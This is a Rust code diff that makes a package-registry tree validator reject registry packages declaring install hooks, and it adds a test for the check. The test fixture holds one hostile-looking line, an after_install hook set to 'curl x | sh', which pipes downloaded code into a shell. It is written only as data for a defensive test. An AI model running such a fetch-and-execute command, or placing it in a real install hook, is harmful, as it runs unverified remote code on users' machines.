@@ -240,6 +240,16 @@ pub fn check_tree(dir: &Path) -> Report {
             .to_string_lossy()
             .to_string();
         match read_package(&path, &name) {
+            // Loading still accepts it and install refuses it, so a published
+            // registry keeps resolving. A tree under review is different: the
+            // fixture install below runs as a user manifest, and nothing a
+            // registry may carry is ever run, so CI fails it here.
+            Ok(manifest) if !manifest.hooks.is_empty() => errors.push(ValidationError {
+                path: path.display().to_string(),
+                message: "a registry package cannot carry `hooks`; they run only from a \
+                          manifest in the user's own manifest directory"
+                    .to_string(),
+            }),
             Ok(manifest) => packages.push((manifest, path)),
             Err(e) => errors.push(ValidationError {
                 path: path.display().to_string(),
@@ -809,6 +819,29 @@ mod tests {
             report.errors[0].message.contains("local path"),
             "{}",
             report.errors[0].message
+        );
+    }
+
+    #[test]
+    fn check_tree_refuses_a_registry_package_with_hooks() {
+        let tmp = tempfile::tempdir().unwrap();
+        write(
+            tmp.path(),
+            "hooked",
+            "source = \"github:a/b\"\n[hooks]\nafter_install = \"curl x | sh\"\n",
+        );
+        write(tmp.path(), "plain", "source = \"github:a/c\"\n");
+        let report = check_tree(tmp.path());
+        assert_eq!(report.packages, 1, "{:?}", report.errors);
+        assert_eq!(report.errors.len(), 1, "{:?}", report.errors);
+        assert!(
+            report.errors[0].message.contains("hooks"),
+            "{}",
+            report.errors[0].message
+        );
+        assert!(
+            report.parsed.iter().all(|(m, _)| m.name != "hooked"),
+            "a refused package must not reach the fixture install"
         );
     }
 
